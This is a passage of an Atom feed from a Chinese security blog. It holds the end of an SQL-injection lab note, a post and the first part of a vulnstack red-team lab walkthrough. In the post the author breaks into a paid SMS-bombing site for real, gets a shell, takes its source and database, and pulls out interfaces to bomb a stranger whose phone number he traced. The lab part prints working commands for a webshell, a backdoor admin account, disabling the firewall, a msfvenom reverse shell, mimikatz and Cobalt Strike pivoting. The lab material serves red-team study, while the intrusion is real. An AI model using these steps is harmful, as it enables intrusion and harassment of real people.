src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/05.jpg" alt="img"></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以这里就不演示了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见注入流程&quot;&gt;&lt;a href=&quot;#常见注入流程&quot; class=&quot;headerlink&quot; title=&quot;常见注入流程&quot;&gt;&lt;/a&gt;常见注入流程&lt;/h1&gt;&lt;h2 id=&quot;联合查询注入&quot;&gt;&lt;a href=&quot;#联合查询注入&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>一次寻找接口的惨痛经历</title>
    <link href="http://www.secice.cn/p/3b26dc86"/>
    <id>http://www.secice.cn/p/3b26dc86</id>
    <published>2020-06-20T01:41:33.000Z</published>
    <updated>2020-12-13T11:15:35.590Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。</p><p>可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。</p><p>翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。</p><a id="more"></a><h2 id="故事开始"><a href="#故事开始" class="headerlink" title="故事开始"></a>故事开始</h2><p>很快就找到了目标站，这里就不上图了，幸运的发现有死抓死吐的洞，就这样，三分钟弹了个shell到自己服务器上。</p><p>开始疯狂在对方服务器上找数据库，起初以为接口保存在裤子里，但是翻了半天，并没有找到。</p><p>不管三七二十一，把源码和裤子打包到本地慢慢找。</p><h2 id="误导"><a href="#误导" class="headerlink" title="误导"></a>误导</h2><p>在phone目录的main.jsp中发现这样一长串的js代码，肯定是做了处理。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/01.png" alt="一次寻找接口的惨痛经历"></p><p>不过这种加密方式以前好像看别人说过怎么解，复制到一个新的html文件，使用alert。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/02.png" alt="一次寻找接口的惨痛经历"></p><p>就这样得到了加密前的源码，可以看出是ajax发包的，于是自己当时十分确定接口就在这些js中。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/03.png" alt="一次寻找接口的惨痛经历"></p><p>切换回client目录的main.jsp文件，确实发现了加密的代码，不过使用的是sojson.v5加密，变量名都被替换了，应该是不能完全解密，在网上也看了一些文章，并没有发现什么详细的解密过程。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/04.png" alt="一次寻找接口的惨痛经历"></p><p>就这样，没有头绪了，眼看接口在眼前却解不开。</p><h2 id="误导-1"><a href="#误导-1" class="headerlink" title="误导"></a>误导</h2><p>继续翻了翻其他目录，发现old目录下存在main.jsp，对比了下确定是同一个文件，但是这个并没有加密，激动得蹦了起来。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/05.png" alt="一次寻找接口的惨痛经历"></p><p>But，从上翻到下，并未发现接口的任何信息，只有一个url，而且提供了帐号密码，从提供的这些信息来看，感觉是调用了远程的接口。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/06.png" alt="一次寻找接口的惨痛经历"></p><p>然后我就用提供的这些参数一顿操作，发现无论如何，都是跳转到BC的站，莫非是引流的。</p><p>开始郁闷了，掏出自己03的虚拟机，把源码在本地搭建了起来，是可以正常运行的，而且火力还挺猛。</p><p>利用fd抓包，可以抓到接口的信息，心里暗自高兴，写了个脚本把抓到的信息处理了一下，加到自己的裤子中，结果就收到三四条短信。。。</p><h2 id="继续懵逼"><a href="#继续懵逼" class="headerlink" title="继续懵逼"></a>继续懵逼</h2><p>很无奈，决定从头仔细看一遍代码，对调用的函数都跟踪了一下，找到了关键的代码位置。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/07.png" alt="一次寻找接口的惨痛经历"></p><p>抓包发现请求包和响应包都是加密的，在虚拟机自己改代码进行调试，将modelUrls和params输出，然后成功显示出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/08.png" alt="一次寻找接口的惨痛经历"></p><p>继续写脚本处理数据，本以为事情到此结束，可是收到的又是不到10条短信。。。</p><h2 id="悔恨"><a href="#悔恨" class="headerlink" title="悔恨"></a>悔恨</h2><p>此时真的不知道接口位置了，只能继续往前推，找到请求的url，“callPhone!callNumberPhone.action”，但是自己对这玩意也不懂呀，不知道代码位置在哪，于是一个目录一个目录的翻，吃了ide的亏，一开始翻的时候ide中并没有显示这些class文件。不然也不会走这么多弯路了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/09.png" alt="一次寻找接口的惨痛经历"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>找到了class文件，就进行了反编译，就这样，所有的接口都到手了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/10.png" alt="一次寻找接口的惨痛经历"></p><p>处理后在本地测试，是自己想要的结果。抽了自己两掌，事情结束。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。&lt;/p&gt;
&lt;p&gt;可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。&lt;/p&gt;
&lt;p&gt;翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK实战系列——红队实战（一）</title>
    <link href="http://www.secice.cn/p/79decd6"/>
    <id>http://www.secice.cn/p/79decd6</id>
    <published>2020-03-25T03:42:55.000Z</published>
    <updated>2020-12-13T11:14:56.550Z</updated>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧</p>          </div><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><h3 id="1-1环境搭建测试"><a href="#1-1环境搭建测试" class="headerlink" title="1.1环境搭建测试"></a>1.1环境搭建测试</h3><p>最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。</p><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><a id="more"></a><p>win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，</p><p>win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）。</p><p>主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy。</p><p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p><p>攻击机：kali ip: 192.168.66.130 / 物理机 ip: 192.168.1.101 / CS server IP : 192.168.66.129</p><p>win7 内网ip: 192.168.52.143  外网ip: 192.168.66.128</p><p>win2003 ip: 192.168.52.141</p><p>win2008 ip: 192.168.52.138</p><h3 id="1-2信息收集"><a href="#1-2信息收集" class="headerlink" title="1.2信息收集"></a>1.2信息收集</h3><p> nmap扫一下可以看到win7开放了80端口，访问一下得知是是phpstudy搭建，尝试利用phpstudy后门拿shell，利用失败。开启phpstudy时看了下目录，有yxcms，百度下关于yxcms的漏洞，都是需要后台才可以getshell的。这里也可以通过phpmyadmin来getshell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/02.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h2 id="二、漏洞利用（两种getshell方式）"><a href="#二、漏洞利用（两种getshell方式）" class="headerlink" title="二、漏洞利用（两种getshell方式）"></a>二、漏洞利用（两种getshell方式）</h2><h3 id="2-1yxcms后台getshell"><a href="#2-1yxcms后台getshell" class="headerlink" title="2.1yxcms后台getshell"></a>2.1yxcms后台getshell</h3><p>打开默认后台 <a href="http://192.168.66.128/yxcms/index.php?r=admin/index/login">http://192.168.66.128/yxcms/index.php?r=admin/index/login</a> 利用burp爆破，admin 123456 登进后台。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/03.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>在前台模板-&gt;管理模板文件-&gt;index_index.php处编辑，插入一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/04.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>shell地址为：<a href="http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php">http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php</a></p><p>蚁剑连接即可获得shell（蚁剑不用代理）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/05.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="2-2phpmyadmin后台getshell"><a href="#2-2phpmyadmin后台getshell" class="headerlink" title="2.2phpmyadmin后台getshell"></a>2.2phpmyadmin后台getshell</h3><p> 此处过程略过，感兴趣小伙伴可以自己尝试。</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="3-1尝试远程登录"><a href="#3-1尝试远程登录" class="headerlink" title="3.1尝试远程登录"></a>3.1尝试远程登录</h3><p> 查看当前用户权限，因为一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/06.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>没有回显，即3389并没有开启或者默认端口被改。</p><p>使用<code>tasklist /svc</code>命令查看服务中存在<code>TermService</code>的PID号，未发现该服务，确定3389端口未开启。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/07.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>我们使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1），当然还有其他开3389的方法，随便用哪种：</p><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/08.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>由于权限较高，直接使用cmd命令 添加用户</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> Aa123456 /add <span class="hljs-comment"># 添加账户密码</span>net localgroup administrators ice /add <span class="hljs-comment"># 给ice账户添加为管理员权限</span>net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> <span class="hljs-comment"># 查询是否成功添加ice用户</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/09.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用账号：ice，密码：Aa123456 登录远程桌面。但是登陆失败，nmap扫描3389端口发现状态为filtered。查看win7，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接。</p><p>由于这里权限较高，我们可以直接在shell中使用<code>netsh advfirewall set allprofiles state off</code>命令关闭防火墙</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>关闭防火墙后利用远程桌面连接服务器即可</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/11.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-2msf反弹shell"><a href="#3-2msf反弹shell" class="headerlink" title="3.2msf反弹shell"></a>3.2msf反弹shell</h3><p>使用msf反弹一个shell。msf生成shell.exe，用蚁剑上传至win7，再在msf设置监听，在蚁剑上执行shell.exe，可以看到msf成功获得一个meterpreter</p><pre><code class="hljs routeros">15:57 root@iceH:~ <span class="hljs-variable">$msfvenom</span> -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.66.130 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe<span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> Arch selected, selecting Arch: x86 <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 341 bytesFinal size of exe file: 73802 bytes</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/12.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-3mimikatz获取账号密码"><a href="#3-3mimikatz获取账号密码" class="headerlink" title="3.3mimikatz获取账号密码"></a>3.3mimikatz获取账号密码</h3><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p><pre><code class="hljs arduino">migrate PIDload mimikatzmimikatz_command -f sekurlsa::searchPasswords</code></pre><p>ps命令查看进程ID，一般选择explorer.exe对应的PID，但是这里它不是system权限，选择注入其他合法进程。</p><p>这一步中我没有成功读出密码 。</p><h3 id="3-4派生CobaltStrike权限"><a href="#3-4派生CobaltStrike权限" class="headerlink" title="3.4派生CobaltStrike权限"></a>3.4派生CobaltStrike权限</h3><p>先在CS上设置监听</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/13.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p> 拥有msf shell的攻击机与搭建cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell</p><pre><code class="hljs sql"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/payload_inject<span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http<span class="hljs-keyword">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><span class="hljs-keyword">set</span> lhost xxxx                   <span class="hljs-comment">#cobaltstrike监听的ip</span><span class="hljs-keyword">set</span> lport <span class="hljs-number">14444</span>                  <span class="hljs-comment">#cobaltstrike监听的端口 </span><span class="hljs-keyword">set</span> <span class="hljs-keyword">session</span> <span class="hljs-number">1</span>                    <span class="hljs-comment">#这里是当前获得的session的id</span>exploit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/14.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>可以看到cs成功接收到shell</p><h3 id="3-5域信息收集"><a href="#3-5域信息收集" class="headerlink" title="3.5域信息收集"></a>3.5域信息收集</h3><p>渗透测试的本质是信息收集，先记录一些常用命令</p><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>ipconfig <span class="hljs-string">/all</span> 　　　　　  <span class="hljs-comment">#查询本机IP段，所在域等 </span>net config Workstation  <span class="hljs-comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span>net user 　　　　　　　   <span class="hljs-comment">#本机用户列表</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>   <span class="hljs-comment">#查看域内所有的主机名 </span>net group <span class="hljs-string">&quot;domain admins&quot;</span> <span class="hljs-string">/domain</span>      <span class="hljs-comment">#查看域管理员 </span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span> <span class="hljs-comment">#查看域控</span>net localhroup administrators          <span class="hljs-comment">#本机管理员[通常含有域用户]</span>net user 用户名 <span class="hljs-string">/domain</span>                 <span class="hljs-comment">#获取指定用户的账户信息  </span>net group <span class="hljs-string">/domain</span>                      <span class="hljs-comment">#查询域里面的工作组 </span>net group 组名 <span class="hljs-string">/domain</span>                  <span class="hljs-comment">#查询域中的某工作组</span></code></pre><p>ipconfig /all看到有内网ip，有域</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/15.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域列表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/16.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询同域机器</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/17.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>判断主域</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/18.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域用户</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/19.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>显示当前域中的计算机列表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/20.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>整理一下信息</p><p>域：god.org</p><p>域内有三个用户：Administrator、ligang、liukaifeng01</p><p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p><p>域控：OWA(192.168.52.138)</p><p> win7内网ip：192.168.52.143</p><h2 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h2><h3 id="4-1添加路由、挂Socks4a代理"><a href="#4-1添加路由、挂Socks4a代理" class="headerlink" title="4.1添加路由、挂Socks4a代理"></a>4.1添加路由、挂Socks4a代理</h3><p>添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</p><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p><p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p><p> 添加内网路由</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/21.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>arp -a查看一下所有接口的当前 ARP 缓存表</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/22.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>设置代理，设置成功后打开其他程序需前加上proxychains</p><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> auxiliary/<span class="hljs-keyword">server</span>/socks4amsf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">show</span> options<span class="hljs-keyword">Module</span> options (auxiliary/<span class="hljs-keyword">server</span>/socks4a):   <span 